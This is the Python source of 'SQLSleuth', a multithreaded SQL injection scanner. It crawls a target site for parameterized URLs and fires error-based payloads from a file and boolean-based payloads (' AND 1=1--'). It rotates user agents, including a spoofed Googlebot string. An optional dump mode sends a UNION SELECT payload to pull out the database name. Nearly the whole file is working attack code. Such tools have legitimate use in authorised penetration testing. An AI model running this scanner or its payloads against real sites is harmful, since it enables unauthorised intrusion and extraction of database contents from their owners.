#!/usr/bin/env python3


import requests
import argparse
import concurrent.futures
import random
import re
from colorama import Fore, Style
from datetime import datetime
from urllib.parse import urljoin, urlparse       # 🔹 for crawler
from bs4 import BeautifulSoup                    # 🔹 crawler depends on this

# ------------------ Error Signatures ------------------
ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch_array()",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "odbc",
    "native client",
    "ora-01756"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.60 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

LOG_FILE = "scan_results.txt"

# ------------------ Utility Functions ------------------
def log_result(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

def is_vulnerable(response_text):
    return any(err.lower() in response_text.lower() for err in ERROR_SIGNATURES)

def load_payloads(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Payload file '{file_path}' not found!" + Style.RESET_ALL)
        return []

def parse_cookie(cookie_str):
    cookies = {}
    if cookie_str:
        for part in cookie_str.split(';'):
            if '=' in part:
                k, v = part.strip().split('=', 1)
                cookies[k] = v
    return cookies

def parse_headers(header_list):
    headers = {}
    if header_list:
        for header in header_list:
            if ':' in header:
                k, v = header.split(':', 1)
                headers[k.strip()] = v.strip()
    return headers

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def send_request(url, payload, method="GET", data=None, cookies=None, headers=None):
    try:
        session = requests.Session()
        if headers is None:
            headers = {}
        if "User-Agent" not in headers:
            headers["User-Agent"] = get_random_user_agent()

        if method == "POST" and data:
            post_data = data.replace("INJECT", payload)
            data_dict = dict(x.split('=', 1) for x in post_data.split('&'))
            return session.post(url, data=data_dict, cookies=cookies, headers=headers, timeout=5)
        else:
            return session.get(url + payload, cookies=cookies, headers=headers, timeout=5)
    except requests.exceptions.RequestException:
        return None

# ------------------ 🔹 Crawler ------------------
visited = set()

def crawl(start_url, max_depth=2, depth=0):
    """Recursively crawl links within the same domain and return parameterized URLs"""
    if depth > max_depth or start_url in visited:
        return []

    visited.add(start_url)
    urls_to_scan = []

    try:
        r = requests.get(start_url, timeout=5, headers={"User-Agent": get_random_user_agent()})
        if r.status_code != 200:
            return []
        soup = BeautifulSoup(r.text, "html.parser")

        for link in soup.find_all("a", href=True):
            href = link["href"]
            full_url = urljoin(start_url, href)

            # stay in same domain
            if urlparse(full_url).netloc != urlparse(start_url).netloc:
                continue

            if full_url not in visited:
                if "?" in full_url:   # only keep URLs with parameters
                    urls_to_scan.append(full_url)
                urls_to_scan.extend(crawl(full_url, max_depth, depth + 1))
    except Exception:
        pass

    return urls_to_scan

# ------------------ SQLi Tests ------------------
def dump_database(url, cookies=None, headers=None):
    print(Fore.MAGENTA + "[*] Dump mode enabled! Trying to extract DB name..." + Style.RESET_ALL)
    log_result(f"[DUMP MODE] Attempting database enumeration on {url}")
    payload = "' UNION SELECT database(),null-- "
    r = send_request(url, payload, "GET", None, cookies, headers)
    if r and r.status_code == 200:
        match = re.search(r">([a-zA-Z0-9_\-]+)<", r.text)
        if match:
            db_name = match.group(1)
            print(Fore.GREEN + f"[DUMP] Database Name: {db_name}" + Style.RESET_ALL)
            log_result(f"[DUMP] Extracted Database Name: {db_name}")
        else:
            print(Fore.YELLOW + "[!] Dump mode: No DB name found." + Style.RESET_ALL)
    else:
        print(Fore.RED + "[!] Dump mode request failed." + Style.RESET_ALL)

def test_error_based(url, payload_file, method="GET", post_data=None, threads=5, cookies=None, headers=None, dump=False):
    payloads = load_payloads(payload_file)
    if not payloads:
        return

    print(f"[i] Using {threads} threads | Payloads: {payload_file} | UA Randomization: ON")
    log_result(f"[*] Started error-based scan on {url}")

    found_vulnerable = False
    dump_triggered = False

    def worker(p):
        nonlocal found_vulnerable, dump_triggered
        if found_vulnerable:
            return
        r = send_request(url, p, method, post_data, cookies, headers)
        if r and is_vulnerable(r.text):
            print(Fore.GREEN + f"[+] Vulnerable! SQL error triggered with payload: {p}" + Style.RESET_ALL)
            log_result(f"[VULNERABLE] {url} | Payload: {p}")
            found_vulnerable = True
            if dump and not dump_triggered:
                dump_database(url, cookies, headers)
                dump_triggered = True

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, p) for p in payloads]
        concurrent.futures.wait(futures)

    if not found_vulnerable:
        print(Fore.YELLOW + "[!] No error-based SQLi found with current payloads." + Style.RESET_ALL)
        log_result(f"[SAFE] No error-based SQLi detected on {url}")

def test_boolean_based(url, method="GET", post_data=None, cookies=None, headers=None, dump=False):
    dump_triggered = False
    true_payload = " AND 1=1--"
    false_payload = " AND 1=2--"
    r_true = send_request(url, true_payload, method, post_data, cookies, headers)
    r_false = send_request(url, false_payload, method, post_data, cookies, headers)

    if r_true and r_false and len(r_true.text) != len(r_false.text):
        print(Fore.GREEN + f"[+] Boolean-based SQLi detected at {url}" + Style.RESET_ALL)
        log_result(f"[VULNERABLE] Boolean-based SQLi detected at {url}")
        if dump and not dump_triggered:
            dump_database(url, cookies, headers)
            dump_triggered = True
    else:
        print(Fore.YELLOW + "[!] No Boolean-based differences found (not conclusive)." + Style.RESET_ALL)
        log_result(f"[SAFE] No Boolean-based SQLi detected on {url}")

# ------------------ Main ------------------
def main():
    parser = argparse.ArgumentParser(description="SQLSleuth - Advanced SQL Injection Scanner")
    parser.add_argument("-u", "--url", help="Target URL with parameter (e.g., http://site.com/page?id=1)")
    parser.add_argument("-d", "--data", help="POST data (use 'INJECT' where payload should be injected)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Threads to use (default: 5)")
    parser.add_argument("-c", "--cookie", help="Session cookies (e.g., PHPSESSID=abc123; security=low)")
    parser.add_argument("--header", action="append", help="Custom headers (e.g., 'User-Agent: Custom')")
    parser.add_argument("-p", "--payloads", default="payloads.txt", help="Custom payload file (default: payloads.txt)")
    parser.add_argument("--dump", action="store_true", help="Enable experimental DB extraction")
    parser.add_argument("--crawl", action="store_true", help="🔹 Crawl site for parameterized URLs before scanning")
    args = parser.parse_args()

    if not args.url:
        print(Fore.RED + "[!] Missing target URL (-u)" + Style.RESET_ALL)
        return

    cookies = parse_cookie(args.cookie) if args.cookie else None
    headers = parse_headers(args.header) if args.header else None
    method = "POST" if args.data else "GET"

    targets = [args.url]
    if args.crawl:
        print(Fore.CYAN + "[*] Crawling for URLs with parameters..." + Style.RESET_ALL)
        crawled = crawl(args.url, max_depth=2)
        targets.extend(crawled)
        targets = list(set(targets))
        print(Fore.CYAN + f"[*] Found {len(targets)} URLs to scan." + Style.RESET_ALL)

    for target in targets:
        log_result(f"\n=== New Scan Started ===")
        log_result(f"Target: {target} | Method: {method} | Payloads: {args.payloads} | Dump: {args.dump}")

        print(f"[i] Testing {target} for error-based SQLi...")
        test_error_based(target, args.payloads, method, args.data, args.threads, cookies, headers, args.dump)

        print(f"[i] Testing {target} for Boolean-based blind SQLi...")
        test_boolean_based(target, method, args.data, cookies, headers, args.dump)

        log_result(f"=== Scan Finished for {target} ===\n")

if __name__ == "__main__":
    main()
